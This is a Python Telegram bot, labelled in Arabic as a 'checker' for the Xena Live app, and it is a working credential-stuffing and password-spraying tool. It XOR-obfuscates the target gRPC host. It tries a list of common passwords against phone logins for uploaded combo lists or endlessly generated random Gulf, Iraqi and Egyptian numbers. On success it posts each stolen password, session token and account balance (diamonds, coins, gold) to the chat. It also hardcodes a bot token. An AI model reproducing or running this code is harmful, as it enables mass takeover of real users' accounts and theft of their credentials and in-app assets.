#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════╗
# ║    📱  Xena Live — Telegram Bot Checker v2.7            ║
# ╚══════════════════════════════════════════════════════════╝

import os
import sys
import time
import random
import hashlib
import struct
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

import grpc
import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ضع توكن البوت الخاص بك هنا
BOT_TOKEN = "8845567682:AAFYWQ2z_avCQ1ZcD-DfJY1kJaLAkAxSsn0"
bot = telebot.TeleBot(BOT_TOKEN)

# ══════════════════════════════════════════════════════════
#  XOR obfuscation — key=0x5A
# ══════════════════════════════════════════════════════════

def _xd(b):
    return bytes(c ^ 0x5A for c in b).decode()

_grpcHost  = bytes([0x28,0x2a,0x39,0x77,0x32,0x2d,0x74,0x22,0x3f,0x34,0x3b,0x36,0x33,0x2c,0x3f,0x74,0x37,0x3f,0x60,0x6e,0x6e,0x69])
_svcPrefix = bytes([0x75,0x3d,0x28,0x2a,0x39,0x74,0x36,0x35,0x3d,0x33,0x34,0x74,0x16,0x35,0x3d,0x33,0x34,0x09,0x3f,0x28,0x2c,0x33,0x39,0x3f])
_pkg       = bytes([0x39,0x35,0x37,0x74,0x22,0x2a,0x3b,0x28,0x2e,0x23,0x74,0x3b,0x34,0x3e,0x28,0x35,0x33,0x3e,0x3b,0x2a,0x2a])
_userAgent = bytes([0x3d,0x28,0x2a,0x39,0x77,0x30,0x3b,0x2c,0x3b,0x77,0x35,0x31,0x32,0x2e,0x2e,0x2a,0x75,0x6b,0x74,0x6c,0x6b,0x74,0x6a])
_licURL    = bytes([0x32,0x2e,0x2e,0x2a,0x29,0x60,0x75,0x75,0x28,0x3b,0x2d,0x74,0x3d,0x33,0x2e,0x32,0x2f,0x38,0x2f,0x29,0x3f,0x28,0x39,0x35,0x34,0x2e,0x3f,0x34,0x2e,0x74,0x39,0x35,0x37,0x75,0x28,0x3f,0x2a,0x36,0x33,0x39,0x3b,0x2e,0x3f,0x62,0x62,0x62,0x6d,0x6c,0x6d,0x62,0x62,0x75,0x0e,0x3f,0x29,0x28,0x75,0x28,0x3f,0x3c,0x29,0x75,0x32,0x3f,0x3b,0x3e,0x29,0x75,0x37,0x3b,0x33,0x34,0x75,0x3b,0x74,0x2e,0x22,0x2e])
_licUser   = bytes([0x36,0x3f,0x2c,0x33,0x6b])

GRPC_HOST  = _xd(_grpcHost)
SVC_PREFIX = _xd(_svcPrefix)
PKG        = _xd(_pkg)
UA         = _xd(_userAgent)
APP_VER    = "2003003"
APP_VN     = "2.3.3.1"

PASSWORDS = [
    "Aa123456@","Aa123456","Aa12345678","Aa12345678@",
    "Aa1234567@","Aa1234567","Aa123123@","Aa123123",
    "Aa12341234","Aa@123456","Aa@123123","Aa@112233",
    "Aa100100@","Aa100100","user@123",
    "123456","1234567","12345678","123456789a",
    "1234567890","1234qwert","1234@1234","11223344",
    "1122334455","1111122222",
    "A123456","A123456@","Password1","P@ssw0rd",
    "password123","password2025","Admin@123","abc12345",
    "111111aa",
    "Qwerty@123","qwerty@123","qwertyuiop","qwert12345",
    "qwer@123","qwer1234","qwerty12345","1q2w3e4r",
    "qqwweerr123",
    "pakistan123","pakistan","786786","twitter@123",
    "mypassword123","iloveyou1","0306KAlee","alle2019",
]

COUNTRY_MAP = {
    "SA": {"code":"966","prefs":["50","51","53","54","55","56","57","58","59"], "ext":7},
    "IQ": {"code":"964","prefs":["770","771","772","773","775","776","780","781","783","785","790","791"],"ext":7},
    "EG": {"code":"20", "prefs":["10","11","12","15"], "ext":8},
    "AE": {"code":"971","prefs":["50","52","54","55","56","58"], "ext":7},
    "KW": {"code":"965","prefs":["50","51","55","60","65","66","69","90","97","99"], "ext":6},
    "QA": {"code":"974","prefs":["30","31","33","50","55","66","70","77"], "ext":6},
    "BH": {"code":"973","prefs":["33","36","37","38","39"], "ext":6},
    "OM": {"code":"968","prefs":["71","72","78","79","91","92","93","94","95","96","97","98","99"],"ext":6},
}

# ══════════════════════════════════════════════════════════
#  Protobuf Functions
# ══════════════════════════════════════════════════════════

def _varint(v):
    b = bytearray()
    while v > 0x7F:
        b.append((v & 0x7F) | 0x80)
        v >>= 7
    b.append(v & 0x7F)
    return bytes(b)

def _fstr(n, val):
    d = val.encode()
    return _varint((n << 3) | 2) + _varint(len(d)) + d

def _fint(n, val):
    return _varint(n << 3) + _varint(val)

def _fbytes(n, data):
    return _varint((n << 3) | 2) + _varint(len(data)) + data

def _pvarint(data, pos):
    val = shift = 0
    while pos < len(data):
        b = data[pos]; pos += 1
        val |= (b & 0x7F) << shift
        if not (b & 0x80): break
        shift += 7
    return val, pos

def _proto(data):
    fields, i = [], 0
    while i < len(data):
        tag, i = _pvarint(data, i)
        if not tag: break
        fn, wt = tag >> 3, tag & 7
        if wt == 0:
            v, i = _pvarint(data, i)
            fields.append((fn, 0, v, None))
        elif wt == 2:
            ln, i = _pvarint(data, i)
            end = i + ln
            if end > len(data): break
            fields.append((fn, 2, 0, data[i:end]))
            i = end
        elif wt == 5: i += 4
        elif wt == 1: i += 8
        else: break
    return fields

def _fget(fields, n):
    for f in fields:
        if f[0] == n: return f
    return None

def _sim_info():
    return (_fint(1,454) + _fstr(2,"00") + _fstr(3,"HK") +
            _fstr(4,"1O1O / csl / Club Sim") + _fstr(5,"CSL"))

def _build_login(phone, password, country):
    return (_fstr(1, phone) +
            _fstr(2, hashlib.md5(password.encode()).hexdigest()) +
            _fstr(5, country) +
            _fbytes(6, _sim_info()))

def _rand_hex(n):
    return ''.join(random.choices('0123456789abcdef', k=n))

def _uuid():
    b = bytearray(os.urandom(16))
    b[6] = (b[6] & 0x0f) | 0x40
    b[8] = (b[8] & 0x3f) | 0x80
    h = b.hex()
    return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}"

def _make_meta(did):
    ts = str(int(time.time() * 1000))
    afid = f"{ts}-{random.randint(0, 2**62)}"
    return [
        ("lang", "ar"), ("version", APP_VER), ("vc", APP_VER), ("vn", APP_VN),
        ("trace_id", _uuid()), ("os", "android"), ("sys_version", "android-10"),
        ("model", "CPH2469"), ("mcc", "454"), ("locale", "ar_SA"),
        ("net_type", "6"), ("pkg", PKG), ("issue_channel", "1"),
        ("did", did), ("timezone", "8"), ("request_time_s", ts),
        ("device_level", "HIGH"), ("idfa", _uuid()), ("afid", afid),
    ]

# ══════════════════════════════════════════════════════════
#  gRPC Client (أصلي تماماً ودون مساس)
# ══════════════════════════════════════════════════════════

class GrpcClient:
    def __init__(self):
        self.did = _rand_hex(16)
        opts = [
            ("grpc.keepalive_time_ms", 20000),
            ("grpc.keepalive_timeout_ms", 10000),
            ("grpc.keepalive_permit_without_calls", 1),
            ("grpc.max_reconnect_backoff_ms", 5000),
        ]
        creds = grpc.ssl_channel_credentials()
        self._ch = grpc.secure_channel(GRPC_HOST, creds, options=opts)
        self._login = self._ch.unary_unary(SVC_PREFIX + "/PhoneLogin", request_serializer=lambda x: x, response_deserializer=lambda x: x)
        self._info = self._ch.unary_unary("/grpc.user.UserService/GetUserInfo", request_serializer=lambda x: x, response_deserializer=lambda x: x)
        self._profile = self._ch.unary_unary("/grpc.user.UserService/GetUserProfile", request_serializer=lambda x: x, response_deserializer=lambda x: x)
        self._balance = self._ch.unary_unary("/grpc.purchase.PurchaseService/GetBalance", request_serializer=lambda x: x, response_deserializer=lambda x: x)

    def call(self, stub, payload, extra_meta=None, timeout=10.0):
        meta = list(_make_meta(self.did))
        if extra_meta: meta.extend(extra_meta)
        if payload is None: payload = b""
        try:
            resp = stub(payload, metadata=meta, timeout=timeout)
            return resp, None
        except grpc.RpcError as e:
            code = e.code()
            if code == grpc.StatusCode.DEADLINE_EXCEEDED: return None, "timeout"
            if code == grpc.StatusCode.UNAUTHENTICATED: return None, "grpc(16)"
            return None, f"grpc({code.value[0]}):{e.details()}"

    def close(self):
        try: self._ch.close()
        except: pass

def _parse_login(data):
    if not data: return {"status": "error"}
    fn, wt = data[0] >> 3, data[0] & 7
    if fn == 2 and wt == 0:
        top = _proto(data)
        r = {"ok": True, "status": "hit", "uid": "", "token": "", "country": "", "platform": "", "shortUID": 0}
        f = _fget(top, 2)
        if f: r["shortUID"] = f[2]
        
        for fld_n in (3, 4):
            f = _fget(top, fld_n)
            if f and f[3]:
                try:
                    sub_fields = _proto(f[3])
                    for sf in sub_fields:
                        if sf[1] == 2 and sf[3]:
                            cand = sf[3].decode(errors="replace").strip()
                            if len(cand) >= 32 and not r["token"]:
                                r["token"] = cand
                except:
                    pass
                
                if not r["token"]:
                    s = f[3].decode(errors="replace").strip()
                    if len(s) >= 32 and "\n" not in s and "\x10" not in s:
                        r["token"] = s
                        
        f = _fget(top, 8)
        if f and f[3]: r["country"] = f[3].decode(errors="replace")
        f = _fget(top, 9)
        if f and f[3]: r["platform"] = f[3].decode(errors="replace")
        f = _fget(top, 10)
        if f and f[3]:
            s = f[3].decode(errors="replace")
            if s.isdigit(): r["uid"] = s
        return r
    return {"status": "fail"}

def _do_login(cli, phone, pw, country):
    payload = _build_login(phone, pw, country)
    data, err = cli.call(cli._login, payload, timeout=5.0)
    if err:
        if err == "timeout": return {"status": "timeout"}
        if "grpc(16)" in err: return {"status": "fail"}
        return {"status": "error"}
    return _parse_login(data)

def _find_vip(data):
    for fn, wt, iv, bv in _proto(data):
        if wt == 2 and bv:
            try:
                s = bv.decode(errors="replace")
                if s.startswith("VIP Lv"): return s
            except: pass
            sub = _find_vip(bv)
            if sub: return sub
    return ""

def _fetch_info(cli, short_uid, token):
    if not short_uid or not token: return {}
    uid_s = str(short_uid)
    body = _fint(1, short_uid)
    extra = [("x-auth-token", token), ("uid", uid_s)]
    data, err = cli.call(cli._info, body, extra_meta=extra, timeout=5.0)
    if err or not data: return {}
    top = _proto(data)
    f2 = _fget(top, 2)
    if not f2 or not f2[3]: return {}
    inner = _proto(f2[3])
    info = {"ok": True}
    f = _fget(inner, 3); info["nickname"] = f[3].decode(errors="replace").strip() if f and f[3] else ""
    f = _fget(inner, 5); info["country"] = f[3].decode(errors="replace") if f and f[3] else ""
    f = _fget(inner, 8); info["xp"] = f[2] if f else 0
    f = _fget(inner, 12)
    if f and f[2] > 0: info["regDate"] = datetime.fromtimestamp(f[2]).strftime("%Y-%m-%d")

    data2, err2 = cli.call(cli._profile, body, extra_meta=extra, timeout=5.0)
    info["vipLevel"] = _find_vip(data2) if not err2 and data2 else ""
    
    d_data, d_err = cli.call(cli._balance, None, extra_meta=extra, timeout=5.0)
    dia = coins = gold = 0
    if not d_err and d_data:
        for fn, wt, iv, _ in _proto(d_data):
            if wt == 0:
                if fn == 1: dia = iv
                if fn == 2: coins = iv
                if fn == 3: gold = iv
    info["diamonds"], info["coins"], info["gold"] = dia, coins, gold
    return info

def format_hit_msg(phone, pw, r, acct, via="DIRECT"):
    country = acct.get("country") or r.get("country", "")
    msg = f"🎯 **XENA LIVE HIT [{via}]**\n" \
          f"━━━━━━━━━━━━━━━━━━━\n" \
          f"📱 **Phone:** `{phone}`\n" \
          f"🔑 **Pass:** `{pw}`\n" \
          f"🆔 **UID:** `{r.get('uid','')}`\n" \
          f"🔢 **Short ID:** `{r.get('shortUID','')}`\n" \
          f"🌍 **Country:** `{country}`\n"
    if acct.get("nickname"): msg += f"👤 **Name:** {acct['nickname']}\n"
    if acct.get("vipLevel"): msg += f"🏆 **VIP:** {acct['vipLevel']}\n"
    if acct.get("gold", 0) > 0: msg += f"💎 **Gold:** {acct['gold']}\n"
    if acct.get("diamonds", 0) > 0: msg += f"💠 **Diamonds:** {acct['diamonds']}\n"
    if acct.get("coins", 0) > 0: msg += f"🪙 **Coins:** {acct['coins']}\n"
    if acct.get("regDate"): msg += f"📅 **Reg Date:** {acct['regDate']}\n"
    if r.get("token"): msg += f"🔐 **Token:** `{r['token']}`\n"
    return msg

def detect_country_and_format(phone_input):
    phone_input = phone_input.strip().replace("+", "")
    
    for cc, data in COUNTRY_MAP.items():
        code = data["code"]
        if phone_input.startswith(code):
            local = phone_input[len(code):].lstrip("-")
            return f"{code}-{local}", cc
            
    for cc, data in COUNTRY_MAP.items():
        clean_input = phone_input[1:] if phone_input.startswith("0") else phone_input
        for pref in data["prefs"]:
            if clean_input.startswith(pref):
                return f"{data['code']}-{clean_input}", cc
                
    return phone_input, "SA"

# ══════════════════════════════════════════════════════════
#  Telegram Handlers & Logic
# ══════════════════════════════════════════════════════════

user_states = {}
stop_events = {}  # متغيرات إيقاف الفحص النشط لكل مستخدم

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("🔍 فحص حساب مفرد", callback_data="single_check"),
        InlineKeyboardButton("📁 فحص ملف كومبو (TXT)", callback_data="combo_check"),
        InlineKeyboardButton("⚡ فحص تلقائي عشوائي (فائق السرعة - لا نهائي)", callback_data="auto_check")
    )
    bot.reply_to(message, "أهلاً بك في بوت فحص حسابات Xena Live.\nاختر أحد خيارات التحكم أدناه:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    
    if call.data.startswith("stop_combo_") or call.data.startswith("stop_auto_"):
        target_chat_id = int(call.data.split("_")[2])
        if target_chat_id in stop_events:
            stop_events[target_chat_id].set()
            bot.answer_callback_query(call.id, "⚠️ جارِ إيقاف الفحص الفائق...")
        else:
            bot.answer_callback_query(call.id, "ℹ️ لا يوجد فحص نشط حالياً.")
        return

    if call.data == "single_check":
        user_states[chat_id] = "waiting_single"
        bot.send_message(chat_id, "أرسل الحساب بالصيغة التالية:\n`الرقم:كلمة المرور`\nأو أرسل الرقم فقط وسيتم فحصه بالباسوردات الافتراضية.", parse_mode="Markdown")
    elif call.data == "combo_check":
        user_states[chat_id] = "waiting_combo"
        bot.send_message(chat_id, "📁 قم برفع ملف الكومبو بصيغة `.txt`\n(يجب أن يكون كل سطر بصيغة `رقم:باسورد` أو `رقم` فقط).")
    elif call.data == "auto_check":
        stop_event = threading.Event()
        stop_events[chat_id] = stop_event
        
        bot.send_message(chat_id, "⚡ جارِ بدء الفحص التلقائي العشوائي (فائق السرعة - تعدد المسارات)...")
        threading.Thread(target=run_fast_auto_checker, args=(chat_id, stop_event), daemon=True).start()

@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id] == "waiting_single")
def process_single(message):
    text = message.text.strip()
    user_states.pop(message.chat.id, None)
    
    parts = text.split(":")
    raw_phone = parts[0].strip()
    custom_pw = parts[1].strip() if len(parts) > 1 else None
    
    phone, country = detect_country_and_format(raw_phone)
    bot.send_message(message.chat.id, f"🔍 جاري فحص الرقم: `{phone}` (الدولة: {country})...", parse_mode="Markdown")
    
    cli = GrpcClient()
    local_part = phone.split("-")[-1] if "-" in phone else phone
    default_first_pw = "0" + local_part
    passwords_to_try = [custom_pw] if custom_pw else [default_first_pw] + PASSWORDS
    
    hit_found = False
    for idx, pw in enumerate(passwords_to_try):
        if not pw: continue
        r = _do_login(cli, phone, pw, country)
        if r.get("status") == "hit":
            acct = _fetch_info(cli, r.get("shortUID", 0), r.get("token", ""))
            msg = format_hit_msg(phone, pw, r, acct, via="SPRAY" if idx > 0 else "DIRECT")
            bot.send_message(message.chat.id, msg, parse_mode="Markdown")
            hit_found = True
            break
            
    if not hit_found:
        bot.send_message(message.chat.id, f"❌ فشل فحص الرقم `{phone}` (لا يوجد Hit صالح).", parse_mode="Markdown")
    cli.close()

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = message.chat.id
    if user_states.get(chat_id) == "waiting_combo":
        user_states.pop(chat_id, None)
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_path = f"temp_{chat_id}.txt"
        with open(file_path, "wb") as f:
            f.write(downloaded_file)
            
        stop_event = threading.Event()
        stop_events[chat_id] = stop_event
        
        bot.send_message(chat_id, "📁 تم تلقي ملف الكومبو. جارِ التحضير وبدء الفحص...")
        threading.Thread(target=run_combo_checker, args=(chat_id, file_path, stop_event), daemon=True).start()

def run_combo_checker(chat_id, file_path, stop_event):
    cli = GrpcClient()
    hits_count = 0
    total = 0
    
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
            total = len(lines)
            
        if total == 0:
            bot.send_message(chat_id, "⚠️ ملف الكومبو فارغ.")
            cli.close()
            return

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_combo_{chat_id}"))

        status_msg = bot.send_message(
            chat_id, 
            f"🔄 **بدء فحص الكومبو التلقائي...**\n"
            f"📊 المجموع الكلي: `{total}`\n"
            f"⏳ تم فحص: `0 / {total}`\n"
            f"🎯 عدد الـ Hits: `0`", 
            parse_mode="Markdown",
            reply_markup=markup
        )
        
        last_update = 0
        for idx, line in enumerate(lines, 1):
            if stop_event.is_set():
                bot.send_message(chat_id, f"🛑 **تم إيقاف فحص الكومبو بناءً على طلبك!**\n📊 تم فحص: `{idx-1} / {total}`\n🎯 الـ Hits المكتشفة: `{hits_count}`", parse_mode="Markdown")
                break

            if ":" in line:
                parts = line.split(":", 1)
                raw_phone, custom_pw = parts[0].strip(), parts[1].strip()
            else:
                raw_phone, custom_pw = line.strip(), None
            
            phone, country = detect_country_and_format(raw_phone)
            local_part = phone.split("-")[-1] if "-" in phone else phone
            default_first_pw = "0" + local_part
            
            passwords_to_try = [custom_pw] if custom_pw else [default_first_pw] + PASSWORDS
            
            hit_found = False
            for idx_pw, pw in enumerate(passwords_to_try):
                if not pw: continue
                r = _do_login(cli, phone, pw, country)
                if r.get("status") == "hit":
                    hits_count += 1
                    acct = _fetch_info(cli, r.get("shortUID", 0), r.get("token", ""))
                    msg = format_hit_msg(phone, pw, r, acct, via="COMBO")
                    bot.send_message(chat_id, msg, parse_mode="Markdown")
                    hit_found = True
                    break
            
            if idx - last_update >= 5 or idx == total:
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=status_msg.message_id,
                        text=f"🔄 **جارِ فحص الكومبو تلقائياً...**\n"
                             f"📊 المجموع الكلي: `{total}`\n"
                             f"⏳ تم فحص: `{idx} / {total}`\n"
                             f"🎯 عدد الـ Hits: `{hits_count}`",
                        parse_mode="Markdown",
                        reply_markup=markup
                    )
                    last_update = idx
                except:
                    pass
                time.sleep(0.1)
        
        if not stop_event.is_set():
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=status_msg.message_id,
                    text=f"🏁 **انتهى فحص الكومبو بالكامل!**\n📊 إجمالي السطور المفحوصة: `{total}`\n🎯 الـ Hits الناجحة الإجمالية: `{hits_count}`",
                    parse_mode="Markdown"
                )
            except:
                pass
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ حدث خطأ أثناء فحص الملف: {e}")
    finally:
        cli.close()
        stop_events.pop(chat_id, None)
        if os.path.exists(file_path):
            os.remove(file_path)

def run_fast_auto_checker(chat_id, stop_event):
    scanned_count = [0]
    hits_count = [0]
    errors_count = [0]
    stats_lock = threading.Lock()
    
    countries = list(COUNTRY_MAP.keys())
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑 إيقاف الفحص السريع", callback_data=f"stop_auto_{chat_id}"))
    
    status_msg = bot.send_message(
        chat_id,
        f"⚡ **بدء الفحص التلقائي فائق السرعة (جميع الدول - لا نهائي)...**\n"
        f"🚀 الحالة: `يعمل بتعدد المسارات (Multi-threaded)`\n"
        f"⏳ إجمالي الأرقام المفحوصة: `0`\n"
        f"🎯 الـ Hits: `0` | ⚠️ الأخطاء: `0`",
        parse_mode="Markdown",
        reply_markup=markup
    )
    
    def worker_task():
        if stop_event.is_set():
            return
        
        cli = GrpcClient()
        try:
            cc = random.choice(countries)
            c_info = COUNTRY_MAP[cc]
            
            pref = random.choice(c_info["prefs"])
            ext = ''.join(str(random.randint(0, 9)) for _ in range(c_info["ext"]))
            local = pref + ext
            phone = c_info["code"] + "-" + local
            
            with stats_lock:
                scanned_count[0] += 1
            
            passwords_to_try = [f"0{local}"] + PASSWORDS
            for idx, pw in enumerate(passwords_to_try):
                if stop_event.is_set():
                    break
                
                r = _do_login(cli, phone, pw, cc)
                status = r.get("status")
                
                if status == "error":
                    with stats_lock:
                        errors_count[0] += 1
                elif status == "hit":
                    with stats_lock:
                        hits_count[0] += 1
                    acct = _fetch_info(cli, r.get("shortUID", 0), r.get("token", ""))
                    msg = format_hit_msg(phone, pw, r, acct, via=f"FAST_{cc}_" + ("SPRAY" if idx > 0 else "DIR"))
                    bot.send_message(chat_id, msg, parse_mode="Markdown")
                    break
        except Exception:
            with stats_lock:
                errors_count[0] += 1
        finally:
            cli.close()

    # استخدام ThreadPoolExecutor لتشغيل عدة عمليات فحص في نفس الوقت وبسرعة فائقة
    with ThreadPoolExecutor(max_workers=6) as executor:
        last_edit_time = time.time()
        while not stop_event.is_set():
            # إرسال مهام فحص جديدة للمسارات
            futures = [executor.submit(worker_task) for _ in range(3)]
            
            # انتظار إكمال الدفعة الحالية
            for f in concurrent.futures.as_completed(futures):
                if stop_event.is_set():
                    break
            
            # تحديث شاشة الحالة بانتظام (كل ثانية تقريباً لضمان السلاسة وعدم حظر التيليجرام)
            if time.time() - last_edit_time >= 1.0:
                with stats_lock:
                    s_cnt = scanned_count[0]
                    h_cnt = hits_count[0]
                    e_cnt = errors_count[0]
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=status_msg.message_id,
                        text=f"⚡ **جارِ الفحص التلقائي فائق السرعة (جميع الدول)...**\n"
                             f"🚀 الحالة: `نشط وفعّال (أداء عالي)`\n"
                             f"⏳ إجمالي الأرقام المفحوصة: `{s_cnt}`\n"
                             f"🎯 الـ Hits: `{h_cnt}` | ⚠️ الأخطاء: `{e_cnt}`",
                        parse_mode="Markdown",
                        reply_markup=markup
                    )
                except:
                    pass
                last_edit_time = time.time()
            
            time.sleep(0.05)

    if stop_event.is_set():
        with stats_lock:
            s_cnt = scanned_count[0]
            h_cnt = hits_count[0]
            e_cnt = errors_count[0]
        try:
            bot.send_message(
                chat_id, 
                f"🛑 **تم إيقاف الفحص فائق السرعة بناءً على طلبك!**\n"
                f"📊 إجمالي الأرقام المفحوصة: `{s_cnt}`\n"
                f"🎯 إجمالي الـ Hits: `{h_cnt}` | ⚠️ إجمالي الأخطاء: `{e_cnt}`", 
                parse_mode="Markdown"
            )
        except:
            pass
    
    stop_events.pop(chat_id, None)

if __name__ == "__main__":
    print("🤖 Bot is running...")
    bot.infinity_polling()
